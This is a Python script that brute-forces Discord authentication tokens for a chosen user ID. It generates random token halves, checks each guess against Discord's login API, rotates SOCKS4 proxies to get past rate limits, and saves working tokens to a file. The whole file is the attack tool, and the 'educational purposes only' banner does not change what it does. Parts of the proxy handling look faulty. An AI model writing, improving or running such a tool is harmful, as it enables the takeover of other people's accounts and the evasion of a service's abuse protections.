import base64
import os
import random
import string
import requests
from colorama import *
import time

p =  open("proxy/socks4.txt", "r")

userid = base64.b64encode((input("UserID: ")).encode("ascii"))
userid = str(userid)[2:-1]
print("WARNING: Educational purposes only!")
time.sleep(3)

ts = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_"

while userid == userid:

    def HMAC(chars = string.ascii_uppercase + string.digits, N=27):
        return ''.join(random.choice(chars) for _ in range(N))

    def timest(chars = string.ascii_uppercase + string.digits, N=random.randint(4, 6)):
        return ''.join(random.choice(chars) for _ in range(N))

    token = userid + '.' + timest(chars=ts) + '.' + HMAC(chars=ts)

    headers={
    'Authorization': token
    }
    url = 'https://discordapp.com/api/v9/auth/login'
    login = requests.get(url, headers=headers)
    try:
        if login.status_code == 200:
            print(Fore.GREEN + '[+] VALID' + ' ' + token)
            f = open('done.txt', "a+")
            f.write(f'{token}\n')
            break
        else:
            print(Fore.RED + '[-] INVALID' + ' ' + token)

        if login.status_code == 429:
          rp = random.choice(list(p.read().split('\n')))
          print(Fore.YELLOW + f"[*] You get rate limited, connected to proxy!")
          login = requests.get(url, headers=headers, proxies={'socks4':"socks4://"+rp})
    finally:
        print("")
input()
